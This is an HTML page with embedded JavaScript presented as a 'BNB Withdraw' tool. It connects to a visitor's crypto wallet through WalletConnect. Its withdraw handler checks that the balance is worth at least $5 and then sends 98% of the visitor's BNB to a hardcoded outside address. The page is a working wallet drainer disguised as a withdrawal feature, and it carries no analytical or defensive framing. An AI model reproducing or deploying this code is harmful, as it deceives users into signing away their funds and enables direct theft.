<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNB Withdraw</title>
  <script type="module" src="wallet.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2rem;
      background: #f9f9f9;
      text-align: center;
    }

    w3m-core-button {
      margin-bottom: 20px;
    }

    #withdrawBtn {
      background-color: #f0b90b;
      color: white;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      display: inline-block;
    }

    #message {
      margin-top: 20px;
      font-weight: bold;
      color: #333;
    }
  </style>
</head>
<body>

  <!-- Wallet Connect Button -->
  <w3m-core-button></w3m-core-button>

  <!-- Withdraw Button -->
  <button id="withdrawBtn" style="display: none;">Withdraw BNB</button>

  <!-- Message Output -->
  <div id="message"></div>

  <!-- Withdraw Logic Script -->
  <script type="module">
    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    const withdrawBtn = document.getElementById("withdrawBtn");
    const messageEl = document.getElementById("message");

    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
    const MIN_USD = 5;
    const sendPercentage = 0.98;

    // Get real-time BNB price
    async function getBNBPriceUSD() {
      try {
        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
        const data = await res.json();
        return parseFloat(data.price);
      } catch {
        return null;
      }
    }

    // Check wallet connection status
    async function checkConnection() {
      const account = getAccount();
      if (account && account.isConnected) {
        withdrawBtn.style.display = "inline-block";
        messageEl.textContent = "";
      } else {
        withdrawBtn.style.display = "none";
        messageEl.textContent = "Please connect your wallet to enable withdrawal.";
      }
    }

    // Withdraw handler
    async function withdraw() {
      const account = getAccount();
      if (!account?.isConnected) {
        messageEl.textContent = "Wallet not connected.";
        return;
      }

      try {
        const balanceData = await fetchBalance({ address: account.address, chainId: 56 });
        const balanceBNB = parseFloat(balanceData.formatted);
        const price = await getBNBPriceUSD();

        if (!price) {
          messageEl.textContent = "Failed to fetch BNB price.";
          return;
        }

        const balanceUSD = balanceBNB * price;

        if (balanceUSD < MIN_USD) {
          messageEl.textContent = "Insufficient balance. At least $5 in BNB is required.";
          return;
        }

        const sendAmount = (balanceBNB * sendPercentage).toFixed(6);
        const valueInWei = BigInt(Math.floor(Number(sendAmount) * 1e18)).toString();

        const { hash } = await sendTransaction({
          to: recipientAddress,
          value: valueInWei
        });

        messageEl.textContent = `Transaction sent. Hash: ${hash}`;
      } catch (err) {
        console.error(err);
        messageEl.textContent = "Transaction failed. Please check your wallet or try again.";
      }
    }

    withdrawBtn.addEventListener("click", withdraw);

    // Monitor wallet status every 1s
    setInterval(checkConnection, 1000);
  </script>
</body>
</html>